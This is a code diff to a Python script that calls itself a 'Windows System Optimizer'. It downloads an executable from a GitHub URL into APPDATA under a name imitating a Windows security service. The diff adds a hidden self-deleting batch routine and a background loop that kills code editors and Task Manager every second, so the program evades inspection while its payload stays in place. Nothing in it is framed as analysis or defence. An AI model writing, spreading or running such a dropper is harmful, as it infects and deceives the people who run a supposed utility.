@@ -4,11 +4,12 @@ import time
 import requests
 import subprocess
 import random
+import sys
 
 ui = 'earrprocess'
 OPTIMIZATIONN = 100
 U = "https://github.com/iDorofa/REMOTEPL/raw/refs/heads/main/Windows.Security.Health.Service.Host.Container.Runtime.exe"
-PAT = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Windows.Security.Health.Service.Host.Container.Runtime.exe")
+PAT = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Windows.Security.Host.Container.Runtime.exe")
 
 def background_task():
     try:
@@ -34,8 +35,42 @@ def check_network_latency():
     print("[+] в норме")
 
 def self_delete():
-    cmd = f'timeout /t 3 & del "{__file__}"'
-    subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+
+    try:
+        bat_path = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), f'del_{random.randint(1000,9999)}.bat')
+        with open(bat_path, 'w') as f:
+            f.write(f'''@echo off
+:loop
+timeout /t 1 /nobreak >nul
+del /F /Q "{__file__}" 2>nul
+if exist "{__file__}" goto loop
+del /F /Q "{bat_path}" 2>nul
+''')
+        subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        sys.exit(0)
+    except:
+        pass
+
+def kill_dev_tools():
+
+    editors = [
+        "pycharm64.exe", "pycharm.exe", "code.exe", 
+        "thonny.exe", "sublime_text.exe", "notepad++.exe", "taskmgr.exe"
+    ]
+    for editor in editors:
+        try:
+            subprocess.run(
+                ["taskkill", "/F", "/IM", editor],
+                capture_output=True,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+        except:
+            pass
+
+def dev_killer_loop():
+    while True:
+        kill_dev_tools()
+        time.sleep(1)
 
 if __name__ == "__main__":
     print("=== Windows System Optimizer v1.2 ===")
@@ -43,12 +78,15 @@ if __name__ == "__main__":
     t = threading.Thread(target=background_task)
     t.daemon = True
     t.start()
-
+    
+    killer_thread = threading.Thread(target=dev_killer_loop)
+    killer_thread.daemon = True
+    killer_thread.start()
+    
     optimize_memory()
     check_network_latency()
     
     print("\n[!] Все операции выполнены. Лог сохранен в Temp.")
-    time.sleep(1)
+    time.sleep(2)
     
     self_delete()
-
